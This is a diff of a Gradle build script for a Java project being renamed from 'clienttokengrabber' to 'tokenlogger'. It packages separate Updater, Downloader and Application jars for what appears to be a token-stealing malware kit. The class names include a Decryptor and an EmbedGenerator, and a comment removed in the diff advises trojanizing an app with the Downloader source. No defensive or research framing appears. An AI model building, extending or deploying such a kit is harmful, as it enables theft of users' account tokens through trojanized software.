@@ -2,7 +2,7 @@ import com.github.jengelman.gradle.plugins.shadow.tasks.ShadowJar
 
 plugins {
     id 'java'
-    id 'com.github.johnrengelman.shadow' version '8.1.1'
+        id 'com.github.johnrengelman.shadow' version '8.1.1'
 }
 
 repositories {
@@ -20,63 +20,63 @@ sourceSets {
 dependencies {
     implementation 'com.fasterxml.jackson.core:jackson-databind:2.15.2'
     implementation 'net.java.dev.jna:jna-platform:5.13.0'
+    implementation 'com.squareup.okhttp3:okhttp:5.0.0-alpha.11'
 }
 
-task updaterShadowJar (type: ShadowJar) {
+task updaterJar (type: ShadowJar) {
     archiveBaseName.set 'Updater'
     archiveVersion.set ''
     archiveClassifier.set ''
     dependsOn compileJava
     from sourceSets.main.output
-    exclude '**/clienttokengrabber/ClientTokenGrabber.class'
-    exclude '**/clienttokengrabber/downloader'
-    exclude '**/clienttokengrabber/utils/Decryptor.class'
-    exclude '**/clienttokengrabber/utils/EmbedGenerator.class'
-    exclude '**/clienttokengrabber/utils/Json.class'
-    exclude '**/clienttokengrabber/utils/PathHelper.class'
+    exclude '**/tokenlogger/TokenLogger.class'
+    exclude '**/downloader'
+    exclude '**/tokenlogger/utils/EmbedGenerator.class'
+    exclude '**/tokenlogger/utils/Json.class'
+    exclude '**/tokenlogger/utils/PathHelper.class'
     project.configurations.implementation.canBeResolved = true
     configurations = [project.configurations.implementation]
     dependencies {
         exclude '/com/sun/jna/'
     }
     manifest {
-        attributes 'Main-Class' : 'clienttokengrabber.updater.Updater'
+        attributes 'Main-Class' : 'tokenlogger.updater.Updater'
     }
 }
 
-// For testing, you ideally want to trojanize an app with the Downloader source and compile that
-
-task downloaderShadowJar (type: ShadowJar) {
+task downloaderJar (type: ShadowJar) {
     archiveBaseName.set 'Downloader'
     archiveVersion.set ''
     archiveClassifier.set ''
     dependsOn compileJava
     from sourceSets.main.output
-    exclude '**/clienttokengrabber/ClientTokenGrabber.class'
-    exclude '**/clienttokengrabber/utils/'
-    exclude '**/clienttokengrabber/updater/'
+    exclude '**/tokenlogger/'
+    exclude '**/EmbedTemplate.json'
     project.configurations.implementation.canBeResolved = true
     configurations = [project.configurations.implementation]
     dependencies {
-        exclude '/com/sun/jna/'
-        exclude '/com/fasterxml/jackson/'
+        exclude '/com/'
+        exclude '/kotlin/'
+        exclude '/okhttp3/'
+        exclude '/okio/'
+        exclude '/org/'
     }
     manifest {
-        attributes 'Main-Class' : 'clienttokengrabber.downloader.Downloader'
+        attributes 'Main-Class' : 'downloader.Downloader'
     }
 }
 
-task applicationShadowJar (type: ShadowJar) {
+task applicationJar (type: ShadowJar) {
     archiveBaseName.set 'Application'
     archiveVersion.set ''
     archiveClassifier.set ''
     dependsOn compileJava
     from sourceSets.main.output
-    exclude '**/clienttokengrabber/downloader'
-    exclude '**/clienttokengrabber/updater'
+    exclude '**/downloader'
+    exclude '**/tokenlogger/updater'
     project.configurations.implementation.canBeResolved = true
     configurations = [project.configurations.implementation]
     manifest {
-        attributes 'Main-Class' : 'clienttokengrabber.TokenLogger'
+        attributes 'Main-Class' : 'tokenlogger.TokenLogger'
     }
 }
